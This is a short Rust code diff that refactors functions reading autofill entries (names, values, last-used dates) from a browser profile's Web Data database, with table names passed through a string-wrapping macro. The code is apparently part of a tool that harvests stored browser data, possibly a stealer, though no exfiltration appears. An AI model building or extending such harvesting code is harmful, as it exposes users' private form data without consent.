@@ -1,5 +1,5 @@
 use alloc::boxed::Box;
-use sqlite::{TableRecord, TableRecordExtension};
+use database::TableRecord;
 use crate::alloc::borrow::ToOwned;
 use alloc::sync::Arc;
 use alloc::vec::Vec;
@@ -43,7 +43,7 @@ fn read_autofills(profile: &Path) -> Option<Vec<AutoFill>> {
     read_sqlite3_and_map_records(&web_data_path, s!("Autofill"), extract_autofill_from_record)
 }
 
-fn extract_autofill_from_record(record: &Box<dyn TableRecord>) -> Option<AutoFill> {
+fn extract_autofill_from_record(record: &dyn TableRecord) -> Option<AutoFill> {
     let last_used = record.get_value(AUTOFILL_DATE_LAST_USED)?.as_integer()?;
     let name = record.get_value(AUTOFILL_NAME)?.as_string()?.clone();
     let value = record.get_value(AUTOFILL_VALUE)?.as_string()?.clone();
